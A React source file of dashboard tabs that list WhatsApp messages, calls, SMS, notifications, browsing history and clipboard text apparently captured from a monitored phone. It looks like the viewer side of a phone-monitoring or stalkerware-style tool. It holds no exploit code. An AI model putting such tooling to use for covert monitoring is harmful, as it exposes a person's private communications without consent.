"use client";

import React from "react";
import { ExternalLink } from "lucide-react";

export function WhatsAppTab({ logs }: { logs: any[] }) {
  if (logs.length === 0) {
    return <p className="text-center py-10 text-xs text-gray-500">No WhatsApp messages captured yet.</p>;
  }
  return (
    <div className="space-y-2 mt-2">
      {logs.map((item, idx) => (
        <div key={idx} className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs">
          <div className="flex items-center justify-between">
            <span className="font-bold text-green-400">{item.senderName || item.sender || "Unknown"}</span>
            <span className="text-[10px] text-gray-500">
              {item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : ""}
            </span>
          </div>
          <p className="text-gray-300 font-normal">{item.messageText || item.text || item.message}</p>
          {item.type && (
            <span className="text-[9px] text-gray-500 uppercase tracking-wider font-semibold">
              Type: {item.type}
            </span>
          )}
        </div>
      ))}
    </div>
  );
}

export function CallsTab({ logs }: { logs: any[] }) {
  if (logs.length === 0) {
    return <p className="text-center py-10 text-xs text-gray-500">No call history available.</p>;
  }
  return (
    <div className="space-y-2 mt-2">
      {logs.map((call, idx) => (
        <div key={idx} className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between text-xs">
          <div>
            <p className="font-bold text-white">{call.number || call.phoneNumber || "Unknown Number"}</p>
            <p className="text-[10px] text-gray-400">
              {call.callType || "Call"} • Duration: {call.duration || 0}s
            </p>
          </div>
          <span className="text-[10px] text-gray-500">
            {call.timestamp ? new Date(call.timestamp).toLocaleDateString() : ""}
          </span>
        </div>
      ))}
    </div>
  );
}

export function SmsTab({ logs }: { logs: any[] }) {
  if (logs.length === 0) {
    return <p className="text-center py-10 text-xs text-gray-500">No SMS logs captured.</p>;
  }
  return (
    <div className="space-y-2 mt-2">
      {logs.map((sms, idx) => (
        <div key={idx} className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs">
          <div className="flex items-center justify-between">
            <span className="font-bold text-blue-400">{sms.address || sms.sender}</span>
            <span className="text-[10px] text-gray-500">
              {sms.date ? new Date(sms.date).toLocaleTimeString() : ""}
            </span>
          </div>
          <p className="text-gray-300">{sms.body || sms.message}</p>
        </div>
      ))}
    </div>
  );
}

export function NotificationsTab({ logs }: { logs: any[] }) {
  if (logs.length === 0) {
    return <p className="text-center py-10 text-xs text-gray-500">No app notifications captured.</p>;
  }
  return (
    <div className="space-y-2 mt-2">
      {logs.map((notif, idx) => (
        <div key={idx} className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-1 text-xs">
          <div className="flex items-center justify-between">
            <span className="font-bold text-yellow-400">{notif.appName || notif.packageName}</span>
            <span className="text-[10px] text-gray-500">
              {notif.timestamp ? new Date(notif.timestamp).toLocaleTimeString() : ""}
            </span>
          </div>
          <p className="text-white font-medium">{notif.title}</p>
          <p className="text-gray-400 text-[11px]">{notif.text}</p>
        </div>
      ))}
    </div>
  );
}

export function WebHistoryTab({ logs }: { logs: any[] }) {
  if (logs.length === 0) {
    return <p className="text-center py-10 text-xs text-gray-500">No web browsing history captured.</p>;
  }
  return (
    <div className="space-y-2 mt-2">
      {logs.map((item, idx) => (
        <div key={idx} className="p-3 bg-[#1B1B22] border border-[#272733] rounded-xl flex items-center justify-between text-xs">
          <div className="min-w-0 pr-3">
            <p className="font-semibold text-white truncate">{item.title || "Visited Web Page"}</p>
            <a
              href={item.url?.startsWith("http") ? item.url : `https://${item.url}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-[11px] text-blue-400 hover:underline flex items-center gap-1 mt-0.5 truncate"
            >
              <span className="truncate">{item.url}</span>
              <ExternalLink className="w-3 h-3 shrink-0" />
            </a>
          </div>
          <span className="text-[10px] text-gray-500 shrink-0">
            {item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : ""}
          </span>
        </div>
      ))}
    </div>
  );
}

export function ClipboardTab({ logs }: { logs: any[] }) {
  const dummyLabels = new Set(["message", "messages", "type a message", "tap to edit", "add your photo", "copied", "copy"]);
  const validLogs = (logs || []).filter(item => {
    const txt = (item.text || item.copiedText || "").trim().toLowerCase();
    return txt.length > 0 && !dummyLabels.has(txt) && !txt.startsWith("type a message");
  });

  if (validLogs.length === 0) {
    return <p className="text-center py-10 text-xs text-gray-500">No copied words or links captured yet.</p>;
  }

  return (
    <div className="space-y-2 mt-2">
      {validLogs.map((item, idx) => {
        const textContent = item.text || item.copiedText || "";
        return (
          <div key={idx} className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-2 text-xs">
            <div className="flex items-center justify-between">
              <span className="text-[10px] px-2 py-0.5 bg-emerald-950 text-emerald-300 border border-emerald-800/40 rounded-full font-bold">
                Copied Word ({textContent.length} chars)
              </span>
              <span className="text-[10px] text-gray-500">
                {item.timestamp ? new Date(item.timestamp).toLocaleString() : ""}
              </span>
            </div>
            <p className="text-gray-100 font-mono bg-[#121217] p-2.5 rounded-lg border border-[#22222b] break-words select-all whitespace-pre-wrap">
              {textContent}
            </p>
          </div>
        );
      })}
    </div>
  );
}
